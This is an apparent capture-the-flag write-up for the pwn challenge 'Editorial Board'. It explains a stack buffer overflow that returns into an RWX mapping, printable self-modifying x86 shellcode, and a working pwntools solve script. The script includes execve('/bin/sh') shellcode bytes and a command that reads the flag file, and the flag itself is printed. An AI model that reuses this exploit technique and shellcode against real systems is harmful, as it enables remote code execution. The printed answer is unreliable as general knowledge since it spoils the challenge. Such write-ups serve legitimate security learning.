# FortID CTF 2026 Writeup: Editorial Board

- **Category:** Pwn
- **Challenge author:** ipaljak
- **Points / Solves:** 265 pts / 17 solves
- **Flag:** `FortID{Sh3llc0d1n6_L1k3_Sh4k3sp34r3_G3ts_7h3_Fl4G!_35911a8af8}`

---

## Challenge

> We are a discerning editorial board committed to publishing clear, polished, human-quality writing. No low-effort AI slop, no noisy drafts, and no suspicious manuscripts. Submit your article for review; if it passes our anti-slop desk, we will typeset it, publish it, and let the prose speak for itself. ✍️

---

## Summary

The accepted paragraph overflows a fixed stack buffer and returns into a fixed RWX mapping. Printable x86 instructions self-modify a small `read`/`jmp` stage there, which loads unrestricted shellcode from the same TLS connection.

## Recon

The binary copies the full accepted paragraph into a 601-byte stack buffer. The saved return address is at input offset 605. Before reading input, it maps `0x10000` RWX bytes at `0x656c6000` and fills them with `0xff`. The prose validator accepts 640–900 bytes from a limited ASCII set, then applies LanguageTool rules.

## Root cause

There is no length check against the stack-copy helper's local buffer. The validator limits paragraph length to 900 bytes, but the helper's stack destination is only `0x259` bytes before the saved frame and return state. The separate fixed mapping is executable, so control can be redirected there while keeping the stack non-executable.

## Exploitation

1. Put `able` at offsets 605–608. Little-endian, this is `0x656c6261`, so the return enters the mapping at offset 609. The `t ` bytes form a short `JZ` that reaches `POPAD`; the prose seed places `icle` at offsets 633–636, loading `ECX = map+873`, and ` t` at 637–638, setting the initial low `AX` value to `0x7420`.
2. Use 24 printable `SUB EAX,imm32` instructions, 13 `AND byte ptr [ECX+0x3a],AH` writes, and 13 `INC ECX` instructions. One `INC` is moved before the first write, so the writes land at `map+932..map+944`, beyond the article in the `0xff`-filled mapping. A final `JNZ` encoded as `up` reaches offset 932: the last write is nonzero (`0xe1`), so ZF is clear. The complete article passes the supplied validator with score 92.64, zero spelling findings, and one non-spelling finding.
3. The 13-byte stage at +932 calls `read(0, ECX, 0x7f)` and jumps to `ECX`. The client sends a 21-byte `execve("/bin/sh", NULL, NULL)` stage after the article. The shell reads `/flag.txt` and prints the flag.

## Reproduction

Start the organizer instance, then run:

```bash
python3 solve.py HOST --port 1337
```

`payload.txt` is the accepted 899-byte article. The client appends one newline, which the binary consumes and trims from its 900-byte initial read, then sends stage two separately. It waits for the service's review result before issuing the shell command.

```python
#!/usr/bin/env python3
from __future__ import annotations

import argparse
import os
import re
import sys
import time
from pathlib import Path

from pwn import context, remote

REVIEW = b"The board is reviewing your manuscript...\n"
ACCEPTED = b"Accepted by the anti-slop desk. Typesetting...\n"
STAGE2 = bytes.fromhex(
    "31 c0 99 68 2f 73 68 00 68 2f 62 69 6e 89 e3 31 c9 b0 0b cd 80"
)

parser = argparse.ArgumentParser()
parser.add_argument("host", nargs="?", default=os.environ.get("CTF_HOST"))
parser.add_argument("--port", type=int, default=int(os.environ.get("CTF_PORT", "1337")))
args = parser.parse_args()
if not args.host:
    parser.error("provide HOST or set CTF_HOST")

article = Path(__file__).with_name("payload.txt").read_bytes()
assert len(article) == 899 and article.endswith(b".")
assert all(byte in b"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ .,;:'-?!" for byte in article)

context.log_level = "error"
io = remote(args.host, args.port, ssl=True, timeout=50)
try:
    banner = io.recvuntil(b"Submit your manuscript:\n", timeout=20)
    io.send(article + b"\n")
    review = io.recvuntil(REVIEW, timeout=15)
    if b"Rejected by the anti-slop desk" in review:
        raise RuntimeError("remote validator rejected the article")

    io.send(STAGE2)
    accepted = io.recvuntil(ACCEPTED, timeout=40)
    time.sleep(0.4)
    io.send(b"cat /flag.txt; exit\n")
    output = banner + review + accepted + io.recvall(timeout=10)
    sys.stdout.buffer.write(output)
    flag = re.search(rb"FortID\{[^}\r\n]+\}", output)
    if not flag:
        raise RuntimeError("no FortID flag in response")
    print(flag.group(0).decode("ascii"))
finally:
    io.close()
```

## Flag

```text
FortID{Sh3llc0d1n6_L1k3_Sh4k3sp34r3_G3ts_7h3_Fl4G!_35911a8af8}
```

## Lessons

The prose filter is only one part of the constraint: instruction bytes, register state, stack-copy geometry, and validator timing all matter. Send the article line first, stage two separately, and allow the full review delay before issuing shell commands.
